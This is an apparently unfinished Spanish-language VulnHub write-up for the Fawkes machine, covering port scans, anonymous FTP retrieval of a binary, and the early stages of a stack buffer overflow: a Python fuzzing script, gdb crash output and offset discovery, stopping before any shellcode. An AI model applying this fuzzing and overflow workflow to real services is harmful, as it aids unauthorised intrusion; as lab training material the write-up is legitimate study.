---
layout: single
title: Fawkes - VulnHub
excerpt: "."
date: 2024-11-17
classes: wide
header:
  teaser: /assets/images/vulnhub-writeup-fawkes/_logo.png
  teaser_home_page: true
  icon: /assets/images/vulnhub.png
categories:
  - VulnHub
  - Hard Machine
tags:
  - Linux
  - FTP
  - MonkeyCom
  - Buffer Overflow
  - 
  - 
---
![](/assets/images/vulnhub-writeup-/_logo.png)

texto

Herramientas utilizadas:
* *ping*
* *nmap*
* *wappalizer*
* *ftp*
* *file*
* *strings*
* *strace*
* **
* **
* **
* **
* **
* **
* **


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#HTTP">Analizando Servicio HTTP</a></li>
				<li><a href="#FTP">Enumeración de Servicio FTP</a></li>
				<li><a href="#Binario">Analizando Binario y Probando su Funcionamiento</a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#BufferOverflow">Proceso para Aplicar Buffer Overflow</a></li>
				<ul>
					<li><a href="#Confirmacion">Tercer Paso: Confirmando Buffer Overflow con gdb</a></li>
					<li><a href="#fuzzingBinario">Cuarto Paso: Aplicando Fuzzing al Binario</a></li>
					<li><a href="#offset">Quinto Paso: Obteniendo el offset</a></li>
					<li><a href="#identificacion">Sexto Paso: Identificando Ubicación de Representación de Caracteres</a></li>
                                        <li><a href="#shellcodeExploit">Septimo Paso: Creación de Shellcode y Creación de Exploit</a></li>
                                        <li><a href="#OpCode">Octavo Paso: Busqueda de OpCode para Aplicar un Salto (JMP) al ESP</a></li>
					<li><a href="#NOPs">Noveno Paso: Aplicando NOPs en Exploit</a></li>
                                        <li><a href="#Exploit">Decimo Paso: Prueba y Ejecución de Exploit</a></li>
				</ul>
			</ul>
		<li><a href="#Post">Post Explotación</a></li>
			<ul>
				<li><a href="#"></a></li>
			</ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>

Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.
```bash
ping -c 4 192.168.1.007
PING 192.168.1.007 (192.168.1.007) 56(84) bytes of data.
64 bytes from 192.168.1.007: icmp_seq=1 ttl=64 time=2.02 ms
64 bytes from 192.168.1.007: icmp_seq=2 ttl=64 time=0.754 ms
64 bytes from 192.168.1.007: icmp_seq=3 ttl=64 time=0.969 ms
64 bytes from 192.168.1.007: icmp_seq=4 ttl=64 time=0.781 ms

--- 192.168.1.007 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3027ms
rtt min/avg/max/mdev = 0.754/1.130/2.017/0.518 ms
```
Por el TTL sabemos que la máquina usa **Linux**, hagamos los escaneos de puertos y servicios.

<h2 id="Puertos">Escaneo de Puertos</h2>

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.1.007 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-17 15:26 CST
Initiating ARP Ping Scan at 15:26
Scanning 192.168.1.007 [1 port]
Completed ARP Ping Scan at 15:26, 0.06s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:26
Scanning 192.168.1.007 [65535 ports]
Discovered open port 21/tcp on 192.168.1.007
Discovered open port 22/tcp on 192.168.1.007
Discovered open port 80/tcp on 192.168.1.007
Discovered open port 2222/tcp on 192.168.1.007
Discovered open port 9898/tcp on 192.168.1.007
Completed SYN Stealth Scan at 15:26, 5.64s elapsed (65535 total ports)
Nmap scan report for 192.168.1.007
Host is up, received arp-response (0.00053s latency).
Scanned at 2024-11-17 15:26:53 CST for 6s
Not shown: 65530 closed tcp ports (reset)
PORT     STATE SERVICE      REASON
21/tcp   open  ftp          syn-ack ttl 64
22/tcp   open  ssh          syn-ack ttl 64
80/tcp   open  http         syn-ack ttl 64
2222/tcp open  EtherNetIP-1 syn-ack ttl 63
9898/tcp open  monkeycom    syn-ack ttl 63
MAC Address: 08:00:27:95:0B:C6 (Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 5.88 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

| Parámetros | Descripción |
|--------------------------|
| *-p-*      | Para indicarle un escaneo en ciertos puertos. |
| *--open*   | Para indicar que aplique el escaneo en los puertos abiertos. |
| *-sS*      | Para indicar un TCP Syn Port Scan para que nos agilice el escaneo. |
| *--min-rate* | Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000). |
| *-vvv*     | Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo. |
| *-n*       | Para indicar que no se aplique resolución dns para agilizar el escaneo. |
| *-Pn*      | Para indicar que se omita el descubrimiento de hosts. |
| *-oG*      | Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts. |

Veo varios puertos abiertos, pero se me hace curioso ver el **servicio FTP y 2 servicios SSH** (puerto 21 y puerto 2222). Además, nunca habia visto el puerto 9898 activo en otras máquinas.

<h2 id="Servicios">Escaneo de Servicios</h2>

```bash
nmap -sCV -p 21,22,80,2222,9898 192.168.1.007 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-17 15:27 CST
Nmap scan report for 192.168.1.007
Host is up (0.00066s latency).

PORT     STATE SERVICE    VERSION
21/tcp   open  ftp        vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0          705996 Apr 12  2021 server_hogwarts
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:Tu_IP
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh        OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 48:df:48:37:25:94:c4:74:6b:2c:62:73:bf:b4:9f:a9 (RSA)
|   256 1e:34:18:17:5e:17:95:8f:70:2f:80:a6:d5:b4:17:3e (ECDSA)
|_  256 3e:79:5f:55:55:3b:12:75:96:b4:3e:e3:83:7a:54:94 (ED25519)
80/tcp   open  http       Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh        OpenSSH 8.4 (protocol 2.0)
| ssh-hostkey: 
|   3072 c4:1d:d5:66:85:24:57:4a:86:4e:d9:b6:00:69:78:8d (RSA)
|   256 0b:31:e7:67:26:c6:4d:12:bf:2a:85:31:bf:21:31:1d (ECDSA)
|_  256 9b:f4:bd:71:fa:16:de:d5:89:ac:69:8d:1e:93:e5:8a (ED25519)
9898/tcp open  monkeycom?
| fingerprint-strings: 
|   GenericLines, GetRequest, HTTPOptions, RTSPRequest: 
|     Welcome to Hogwart's magic portal
|     Tell your spell and ELDER WAND will perform the magic
|     Here is list of some common spells:
|     Wingardium Leviosa
|     Lumos
|     Expelliarmus
|     Alohomora
|     Avada Kedavra 
|     Enter your spell: Magic Output: Oops!! you have given the wrong spell
|     Enter your spell:
|   NULL: 
|     Welcome to Hogwart's magic portal
|     Tell your spell and ELDER WAND will perform the magic
|     Here is list of some common spells:
|     Wingardium Leviosa
|     Lumos
|     Expelliarmus
|     Alohomora
|     Avada Kedavra 
|_    Enter your spell:
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9898-TCP:V=7.94SVN%I=7%D=11/17%Time=673A5FC2%P=x86_64-pc-linux-gnu%
SF:r(NULL,DE,"Welcome\x20to\x20Hogwart's\x20magic\x20portal\nTell\x20your\
SF:x20spell\x20and\x20ELDER\x20WAND\x20will\x20perform\x20the\x20magic\n\n
SF:Here\x20is\x20list\x20of\x20some\x20common\x20spells:\n1\.\x20Wingardiu
SF:m\x20Leviosa\n2\.\x20Lumos\n3\.\x20Expelliarmus\n4\.\x20Alohomora\n5\.\
SF:x20Avada\x20Kedavra\x20\n\nEnter\x20your\x20spell:\x20")%r(GenericLines
SF:,125,"Welcome\x20to\x20Hogwart's\x20magic\x20portal\nTell\x20your\x20sp
SF:ell\x20and\x20ELDER\x20WAND\x20will\x20perform\x20the\x20magic\n\nHere\
SF:x20is\x20list\x20of\x20some\x20common\x20spells:\n1\.\x20Wingardium\x20
SF:Leviosa\n2\.\x20Lumos\n3\.\x20Expelliarmus\n4\.\x20Alohomora\n5\.\x20Av
SF:ada\x20Kedavra\x20\n\nEnter\x20your\x20spell:\x20Magic\x20Output:\x20Oo
SF:ps!!\x20you\x20have\x20given\x20the\x20wrong\x20spell\n\nEnter\x20your\
SF:x20spell:\x20")%r(GetRequest,125,"Welcome\x20to\x20Hogwart's\x20magic\x
SF:20portal\nTell\x20your\x20spell\x20and\x20ELDER\x20WAND\x20will\x20perf
SF:orm\x20the\x20magic\n\nHere\x20is\x20list\x20of\x20some\x20common\x20sp
SF:ells:\n1\.\x20Wingardium\x20Leviosa\n2\.\x20Lumos\n3\.\x20Expelliarmus\
SF:n4\.\x20Alohomora\n5\.\x20Avada\x20Kedavra\x20\n\nEnter\x20your\x20spel
SF:l:\x20Magic\x20Output:\x20Oops!!\x20you\x20have\x20given\x20the\x20wron
SF:g\x20spell\n\nEnter\x20your\x20spell:\x20")%r(HTTPOptions,125,"Welcome\
SF:x20to\x20Hogwart's\x20magic\x20portal\nTell\x20your\x20spell\x20and\x20
SF:ELDER\x20WAND\x20will\x20perform\x20the\x20magic\n\nHere\x20is\x20list\
SF:x20of\x20some\x20common\x20spells:\n1\.\x20Wingardium\x20Leviosa\n2\.\x
SF:20Lumos\n3\.\x20Expelliarmus\n4\.\x20Alohomora\n5\.\x20Avada\x20Kedavra
SF:\x20\n\nEnter\x20your\x20spell:\x20Magic\x20Output:\x20Oops!!\x20you\x2
SF:0have\x20given\x20the\x20wrong\x20spell\n\nEnter\x20your\x20spell:\x20"
SF:)%r(RTSPRequest,125,"Welcome\x20to\x20Hogwart's\x20magic\x20portal\nTel
SF:l\x20your\x20spell\x20and\x20ELDER\x20WAND\x20will\x20perform\x20the\x2
SF:0magic\n\nHere\x20is\x20list\x20of\x20some\x20common\x20spells:\n1\.\x2
SF:0Wingardium\x20Leviosa\n2\.\x20Lumos\n3\.\x20Expelliarmus\n4\.\x20Aloho
SF:mora\n5\.\x20Avada\x20Kedavra\x20\n\nEnter\x20your\x20spell:\x20Magic\x
SF:20Output:\x20Oops!!\x20you\x20have\x20given\x20the\x20wrong\x20spell\n\
SF:nEnter\x20your\x20spell:\x20");
MAC Address: 08:00:27:95:0B:C6 (Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 100.23 seconds
```

| Parámetros | Descripción |
|--------------------------|
| *-sC*      | Para indicar un lanzamiento de scripts básicos de reconocimiento. |
| *-sV*      | Para identificar los servicios/versión que están activos en los puertos que se analicen. |
| *-p*       | Para indicar puertos específicos. |
| *-oN*      | Para indicar que el output se guarde en un fichero. Lo llame targeted. |

Parece que para el **servicio FTP** tenemos activo el **usuario anonymous**, pero me intriga el resultado del puerto 9898, pues parecen comandos que puedes usar para comunicarte o para realizar una acción.

Vamos a ir primero por lo web y luego al **servicio FTP**.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
</div>
<br>


<h2 id="HTTP">Analizando Servicio HTTP</h2>

Entremos:

<p align="center">
<img src="/assets/images/vulnhub-writeup-fawkes/Captura1.png">
</p>

Igual que en las máquinas anteriores, solamente una imagen.

Veamos que nos dice **Wappalizer**:

<p align="center">
<img src="/assets/images/vulnhub-writeup-fawkes/Captura2.png">
</p>

No mucho.

Te diría que aplicaramos **Fuzzing** para ver que podemos encontrar, pero no encontraremos nada, así que vamos a entrar al **servicio FTP** para ver que encontramos.

<h2 id="FTP">Enumerando de Servicio FTP</h2>

Entremos usando el usuario anonymous:
```batch
ftp 192.168.1.007
Connected to 192.168.1.007.
220 (vsFTPd 3.0.3)
Name (192.168.1.007:berserkwings): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||33401|)
150 Here comes the directory listing.
-rwxr-xr-x    1 0        0          705996 Apr 12  2021 server_hogwarts
226 Directory send OK.
ftp> get server_hogwarts
local: server_hogwarts remote: server_hogwarts
229 Entering Extended Passive Mode (|||38203|)
150 Opening BINARY mode data connection for server_hogwarts (705996 bytes).
100% |******************************|   689 KiB   26.28 MiB/s    00:00 ETA
226 Transfer complete.
705996 bytes received in 00:00 (25.07 MiB/s)
ftp> exit
221 Goodbye.
```

Encontramos únicamente un archivo y lo descargamos en nuestra máquina.

Con el comando **file**, podemos ver que clase de archivo es:
```bash
file server_hogwarts
server_hogwarts: ELF 32-bit LSB executable, Intel 80386, version 1 (GNU/Linux), statically linked, BuildID[sha1]=1d09ce1a9929b282f26770218b8d247716869bd0, for GNU/Linux 3.2.0, not stripped
```
Parece ser un binario de **Linux** y tiene una arquitectura de 32 bits (x86).

Si lo analizamos con el comando **strings**, veremos dentro de todo el resultado algunas funciones del **lenguaje C**.

Esto ya nos puede dar una pista de a que nos enfrentamos, pues puede ser que debamos aplicar **Buffer Overflow**.

<h2 id="Binario">Analizando Binario y Probando su Funcionamiento</h2>

Primero, ¿qué es un **Buffer Overflow**?

| **Buffer Overflow** |
|:-----------:|
| *El desbordamiento del búfer es una anomalía que se produce cuando el software que escribe datos en un búfer desborda la capacidad del búfer, lo que provoca que se sobrescriban las ubicaciones de memoria adyacentes. En otras palabras, se pasa demasiada información a un contenedor que no cuenta con el espacio suficiente, y esa información acaba sustituyendo a los datos de los contenedores adyacentes. Los atacantes pueden aprovecharse de los desbordamientos del búfer con el objetivo de modificar la memoria de un ordenador para socavar o tomar el control de la ejecución del programa.* |

<br>

Existen algunas funciones comunes que pueden indicar que un binario es vulnerable a **Buffer Overflow**. Estas son:
* `gets()`: No verifica los límites del buffer.
* `strcpy(), strcat()`: Copian cadenas sin verificar.
* `scanf()` con especificadores `%s` sin límites.

Podemos buscarlas con **grep** al usar el comando **strings**:
```bash
strings server_hogwarts | grep "strcpy"
strcpy.o
strcpy_ifunc
strcpy
__strcpy_ia32
__strcpy_ssse3
__strcpy_sse2
```
Encontramos la función `strcpy()`.

Además, con la herramienta **strace** podemos analizar el binario, ya que permite rastrear las llamadas al sistema (**syscalls**) y las señales realizadas por un programa o proceso.

Para esto, debemos darle permisos de ejecución al binario y luego usamos la herramienta **strace**:
```bash
chmod +x server_hogwarts
strace ./server_hogwarts
execve("./server_hogwarts", ["./server_hogwarts"], 0x7fffea0ff4d0 /* 37 vars */) = 0
[ Process PID=27474 runs in 32 bit mode. ]
brk(NULL)                               = 0x92c3000
brk(0x92c37c0)                          = 0x92c37c0
set_thread_area({entry_number=-1, base_addr=0x92c32c0, limit=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1}) = 0 (entry_number=12)
uname({sysname="Linux", nodename="kali-berserkwings", ...}) = 0
readlink("/proc/self/exe", "/home/..."..., 4096) = 65
brk(0x92e47c0)                          = 0x92e47c0
brk(0x92e5000)                          = 0x92e5000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
setsockopt(3, SOL_SOCKET, SO_REUSEPORT, [1], 4) = 0
bind(3, {sa_family=AF_INET, sin_port=htons(9898), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
listen(3, 3)                            = 0
accept(3, ^C0xffdf4184, [16])             = ? ERESTARTSYS (To be restarted if SA_RESTART is set)
strace: Process 27474 detached
```
Parece que el binario ejecuta un proceso usando nuestra IP y el puerto 9898. Por lo que entiendo, el binario esta funcionando como un servidor, así que podemos conectarnos a este con **nc**.

Recordando el escaneo, vimos que estaba usando el puerto 9898, así que posiblemente están usando este mismo binario.

Vamos a conectarnos a la máquina víctima en su puerto 9898 con **netcat**:
```bash
nc 192.168.1.007 9898
Welcome to Hogwart's magic portal
Tell your spell and ELDER WAND will perform the magic

Here is list of some common spells:
1. Wingardium Leviosa
2. Lumos
3. Expelliarmus
4. Alohomora
5. Avada Kedavra 

Enter your spell: Wingardium Leviosa
Magic Output: You have successfully leviate the object

Enter your spell: Lumos
Magic Output: Entire surrounding is illuminated

Enter your spell: Expelliarmus
Magic Output: Your opponent is disarmed

Enter your spell: Alohomora
Magic Output: All the doors are unlocked

Enter your spell: Avada Kedavra
Magic Output: This spell is black magic and is forbidden in hogwarts

Enter your spell: ^C
```
Pudimos ejecutar hechizos.

Entonces, si usamos el binario y nos conectamos con **netcat** a nuestra propia IP, deberíamos ver lo mismo.

Probemoslo:
* Terminal 1 - **Binario**:
```bash
./server_hogwarts
```

* Terminal 2 - **netcat**:

```bash
nc localhost 9898
Welcome to Hogwart's magic portal
Tell your spell and ELDER WAND will perform the magic

Here is list of some common spells:
1. Wingardium Leviosa
2. Lumos
3. Expelliarmus
4. Alohomora
5. Avada Kedavra 

Enter your spell: Lumos
Magic Output: Entire surrounding is illuminated

Enter your spell: 
```

Excelente, podemos hacer nuestras pruebas con el binario descargado.

La primera que haremos, será usar un monton de A's para romper el funcionamiento del binario y ver que es lo que pasa.

Con el siguiente comando de **Python**, creamos 200 A's que vamos a usar:
```bash
python3 -c 'print("A" * 200)'
AAAAA...
```

Vuelve a ejecutar el binario y aplica las A's. Observa la respuesta que obtuvimos:
```bash
/server_hogwarts
zsh: segmentation fault  ./server_hogwarts
```
Hemos crasheado el binario y obtuvimos el mensaje **segmentation fault**, que es un indicativo más de un posible **Buffer Overflow**.


<br>
<br>
<hr>
<div style="position: relative;">
  <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
</div>
<br>


<h2 id="BufferOverflow">Proceso para Aplicar Buffer Overflow</h2>

Para que podamos aplicar **Buffer Overflow**, es necesario que conozcamos ciertos conceptos y pasos a seguir.

Estos son los pasos que yo considero, son los que se deben aplicar para realizar un **Buffer Overflow**:
* **Primero**: Identificar si un archivo encontrado es un binario.
* **Segundo**: Estudiar y analizar su funcionamiento.
* **Tercer**: Confirmar vulnerabilidad con herramienta **gdb**.
* **Cuarto**: Aplicar Fuzzing para detectar limites del binario.
* **Quinto**: Identificar el **offset**.
* **Sexto**: Identificar en qué parte de la memoria se están representando los caracteres introducidos.
* **Septimo**: Creación de Shellcode malicioso y creación de Exploit.
* **Octavo**: Busqueda de **OpCode JMP ESP**.
* **Noveno**: Aplicación de NOPs y/o desplazamiento de pila.
* **Decimo**: Prueba y ejecución de Exploit.

Aca te dejo unos links con buena información sobre **Buffer Overflow**:
* <a href="https://keepcoding.io/blog/que-es-un-buffer-overflow/" target="_blank">¿Qué es un buffer overflow?</a>
* <a href="https://www.fortinet.com/lat/resources/cyberglossary/buffer-overflow" target="_blank">Desbordamiento de búfer</a>
* <a href="https://www.cloudflare.com/es-es/learning/security/threats/buffer-overflow/" target="_blank">¿Qué es el desbordamiento del búfer?</a>

Para este punto, ya hemos completado el punto 1 y 2, así que sigamos con los otros 3.

<br>

<h3 id="Confirmacion">Tercer Paso: Confirmando Buffer Overflow con gdb</h3>

En mi caso, segui esta guia para instalar la herramienta **gdb**:
<a href="https://www.gdbtutorial.com/tutorial/how-install-gdb" target="_blank">Guide to use GDB and learn debugging techniques: How to Install GDB?</a>

Y le instale la siguiente expansión para mejorar la herramienta **gdb**:
<a href="https://github.com/hugsy/gef" target="_blank">Repositorio de hugsy: gef</a>

Una vez que los tengas instalados, vamos a ejecutar **gdb** junto al binario:
```bash
gdb -q ./server_hogwarts
```

Hay muchos comandos que podemos usar dentro de **gdb** y aun más con la expansión que añadimos.

Por ejemplo, podemos analizar la seguridad del binario con `checksec`:
```bash
gef➤  checksec
[+] checksec for '/home/berserkwings/Desktop/VulnHub/Fawkes/content/server_hogwarts'
Canary                        : ✓ (value: 0xf4fcd700)
NX                            : ✘ 
PIE                           : ✘ 
Fortify                       : ✘ 
RelRO                         : ✘ 
```
Esto es otro indicativo de que el binario es bastante vulnerable a **Buffer Overflow**, ya que no tiene la suficiente seguridad.

Investiguemos que es **Canary**.

| **stack canary** |
|:-----------:|
| *Un stack canary es un valor especial que se coloca en la pila (stack) para detectar sobrescrituras. Esto significa que, si intentas sobrescribir datos en la pila, como el EIP, primero tendrías que evitar alterar su valor. Si el canario cambia, el programa detectará el ataque y terminará.* |

<br>

Ahora, vayamos al siguiente paso.

<br>

<h3 id="fuzzingBinario">Cuarto Paso: Aplicando Fuzzing al Binario</h3>

Esta parte es esencial para identificar los limites del binario o aplicación, introduciendo varias cantidades de caracteres hasta que falle.

Esto ya lo hicimos, pero aquí te dejo un script de **Python** que puedes usar para introducir la cantidad de caracteres que quieras (este script puede servir para otros casos de **Buffer Overflow**, aunque depende de cada caso).

El script lo llame **spiker.py**:
```python
#!/usr/bin/python3
import socket
import argparse


def parse_arguments():
        parser = argparse.ArgumentParser(description="Script para fuzzear monkeycom")
        parser.add_argument("--ip_addr", required=True, help="Dirección IP a utilizar")
        parser.add_argument("--port", type=int, required=True, help="Puerto a utilizar")
        parser.add_argument("--length", type=int, required=True, help="Cantidad de A's a enviar")
        return parser.parse_args()


def exploit(ip, port, length):
        try:
                # Creando conexión vía TCP/IP
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                print(f"\n[+] Conectando a {ip}:{port}...\n")
                s.connect((ip, port))

                # Recibiendo banner
                banner = s.recv(1024)
                print(f"\n[+] Recibiendo Banner: \n------\n{banner.decode('utf-8', errors='ignore')}\n------\n")

                # Creando y enviando payload
                payload = b"A" * length + b'\r\n'
                print(f"[*] Payload Enviado: {payload}\n")
                s.send(payload)

                # Recibiendo respuesta
                response = s.recv(1024)
                if response:
                        print(f"\n[+] Respuesta del servidor: {response.decode('utf-8', errors='ignore')}\n")
                else:
                        print(f"\n[!] Sin respuesta.")

        # Manejo de errores
        except socket.error as e:
                print(f"[!] Error de conexión: {e}")

        except Exception as e:
                print(f"[!] Ocurrio un error: {e}")

        # Cerrando la conexión
	finally:
                s.close()
                print("\n[+] Cerrando conexión.")


if __name__ == '__main__':
        args = parse_arguments()
        exploit(args.ip_addr, args.port, args.length)
```
Es muy simple su uso, debes indicarle la IP, el puerto y la cantidad de caracteres a enviar. Los caracteres que se van a enviar son **A's** solamente.

Puedes probarlo contra el binario o hacerlo manualmente.

Para ejecutar el binario, usamos solamente la letra **r**:
```bash
gef➤  r
Starting program: ../Fawkes/content/server_hogwarts
```

Como ya esta iniciado, vamos a enviar el mismo payload de **200 A's** y observamos la respuesta que nos de **gdb**:
```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcbbc  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0xffffce40  →  0x0000000a ("\n"?)
$edx   : 0xffffcc84  →  0x0000000a ("\n"?)
$esp   : 0xffffcc30  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x080b3158  →  "../csu/libc-start.c"
$edi   : 0xffffd178  →  "\nEnter your spell: "
$eip   : 0x41414141 ("AAAA"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcc30│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"    ← $esp
0xffffcc34│+0x0004: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffcc38│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffcc3c│+0x000c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffcc40│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffcc44│+0x0014: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffcc48│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
0xffffcc4c│+0x001c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x41414141
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "server_hogwarts", stopped 0x41414141 in ?? (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
```
Con **200 A's** es suficiente para que el binario deje de funcionar, pero pueden ser menos y es lo que debemos identificar.

<br>

<h3 id="offset">Quinto Paso: Obteniendo el offset</h3>

Desde aquí, podemos identificar el **offset que es el número exacto de bytes que necesitas para sobrescribir el EIP**.

Para esto, podemos generar un patron de distintos caracteres para que sea más facil identificar el **offset**.

Desde **gdb**, usamos el comando **pattern create** para que nos de 1024 caracteres que podamos usar: 
```bash
gef➤  pattern create
[+] Generating a pattern of 1024 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaa...
```

Ahora, ejecutamos el binario con **r** y enviamos los caracteres que tenemos:
```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffcbbc  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$ebx   : 0x62616162 ("baab"?)
$ecx   : 0xffffd180  →  "our spell: "
$edx   : 0xffffcfc4  →  "our spell: "
$esp   : 0xffffcc30  →  "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"
$ebp   : 0x62616163 ("caab"?)
$esi   : 0x080b3158  →  "../csu/libc-start.c"
$edi   : 0xffffd178  →  "\nEnter your spell: "
$eip   : 0x62616164 ("daab"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcc30│+0x0000: "eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqa[...]"    ← $esp
0xffffcc34│+0x0004: "faabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabra[...]"
0xffffcc38│+0x0008: "gaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsa[...]"
0xffffcc3c│+0x000c: "haabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabta[...]"
0xffffcc40│+0x0010: "iaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabua[...]"
0xffffcc44│+0x0014: "jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]"
0xffffcc48│+0x0018: "kaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwa[...]"
0xffffcc4c│+0x001c: "laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]"
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x62616164
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "server_hogwarts", stopped 0x62616164 in ?? (), reason: SIGSEGV
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
```
Observa el **EIP**, se pueden ver letras especificas que podemos identificar de todo el payload.

Lo podemos hacer manualmente de la siguiente manera:

* Copia el payload y dentro de tu terminal, usalo dentro de **echo** y pipealo con **grep**, buscando las 4 letras que estan en el **EIP**:
```bash
echo -n "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaa..." | grep "daab"
```

